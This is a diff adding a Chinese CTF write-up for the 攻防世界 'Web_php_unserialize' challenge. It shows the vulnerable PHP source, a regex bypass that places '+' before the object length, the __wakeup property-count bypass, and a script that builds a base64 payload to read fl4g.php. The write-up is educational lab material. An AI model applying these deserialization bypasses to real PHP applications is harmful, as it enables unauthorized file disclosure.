@@ -681,3 +681,92 @@ echo serialize($nisa);
 
 
 
+## Web_php_unserialize【攻防世界】
+
+正则表达式绕过：`preg_match('/[oc]:\d+:/i', $var)`
+
+该正则表达式会匹配 c:123 0:32 o:234 等形式的子字符串，但是可以在描述**对象名称长度**的**数字前面加上+符号**，能绕过正则表达式，还能被**正常的反序列化**。
+
+```
+O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
+```
+
+可以改为：
+
+```
+O:+4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
+```
+
+
+
+__wakeup 函数是魔术用法会在对象反序列化时自动执行。
+
+PHP5 < 5.6.25， PHP7 < 7.0.10 的版本存在wakeup的漏洞。
+
+当要被反序列化的字符串中，描述的对象属性的个数，与php中对象**属性的数量不同时**，__wakup**不会被执行**。
+
+```
+O:+4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
+```
+
+替换为
+
+```
+O:+4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}
+```
+
+
+
+私有属性会在属性名称的开始和末尾添加"%00"，当前php程序也会对字符串进行base64解码，为了防止在复制字符串的时候漏掉"%00"，在构建php字符串后，进行base64编码后在输出。
+
+
+
+```php
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+if (isset($_GET['var'])) { 
+    $var = base64_decode($_GET['var']); 
+    if (preg_match('/[oc]:\d+:/i', $var)) { 
+        die('stop hacking!'); 
+    } else {
+        @unserialize($var); 
+    } 
+} else { 
+    highlight_file("index.php"); 
+} 
+?>
+```
+
+
+
+payload：
+
+```php
+<?php
+class Demo {
+    private $file = 'fl4g.php';
+}
+
+$str = serialize(new Demo());
+$str = str_replace("O:4","O:+4",$str );
+$str = str_replace("1:","2:",$str );
+echo base64_encode($str);
+?>
+
+// TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
+```
+
